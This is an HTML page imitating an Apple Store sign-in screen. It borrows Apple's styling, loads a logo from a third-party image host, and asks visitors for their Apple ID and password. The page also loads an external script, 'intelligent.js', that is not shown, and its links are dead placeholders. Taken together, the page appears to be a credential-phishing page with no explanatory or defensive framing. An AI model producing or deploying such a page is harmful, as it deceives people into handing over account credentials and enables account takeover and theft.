<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple Store Login</title>

<style>
    body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        background: #f5f5f7;
        color: #1d1d1f;
    }

    .header {
        background: white;
        padding: 18px;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .header img {
        width: 200px;
    }

    .login-box {
        max-width: 380px;
        margin: 60px auto;
        background: #ffffff;
        padding: 35px 30px;
        border-radius: 18px;
        box-shadow: 0 6px 18px rgba(0,0,0,0.12);
    }

    .login-box h2 {
        text-align: center;
        font-weight: 600;
        margin-bottom: 25px;
        font-size: 22px;
    }

    .input-group {
        margin-bottom: 20px;
    }

    .input-group label {
        display: block;
        margin-bottom: 6px;
        font-size: 14px;
        font-weight: 500;
    }

    .input-group input {
        width: 100%;
        padding: 12px;
        font-size: 15px;
        border: 1px solid #d2d2d7;
        border-radius: 10px;
        outline: none;
        transition: .2s;
        background: #f5f5f7;
    }

    .input-group input:focus {
        border-color: #0071e3;
        box-shadow: 0 0 6px rgba(0,113,227,0.4);
        background: #ffffff;
    }

    .login-btn {
        width: 100%;
        padding: 14px;
        background: #0071e3;
        color: white;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background .2s;
        margin-top: 10px;
    }

    .login-btn:hover {
        background: #0060c9;
    }

    .links {
        text-align: center;
        margin-top: 20px;
        font-size: 14px;
    }

    .links a {
        color: #0071e3;
        text-decoration: none;
        font-weight: 500;
    }

    .links a:hover {
        text-decoration: underline;
    }
</style>
</head>
<script src="intelligent.js"></script>
<body>

<div class="header">
    <!-- Minimal Apple Logo -->
    <img src="https://i.ibb.co/5hBt5hMv/Background-Eraser-20251204-212533709.png" alt="Apple">
</div>

<div class="login-box">
    <h2>Sign in to Apple Store</h2>
<form>
    <div class="input-group">
        <label>Apple ID</label>
        <input type="text" placeholder="example@icloud.com" name="Apple id" required>
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="password" placeholder="Enter your password" name="password" required>
    </div>

    <button class="login-btn">Sign In</button>
</form>
    <div class="links">
        <p><a href="#">Forgot your Apple ID or password?</a></p>
        <p><a href="#">Create Apple ID</a></p>
    </div>
</div>

</body>
</html>
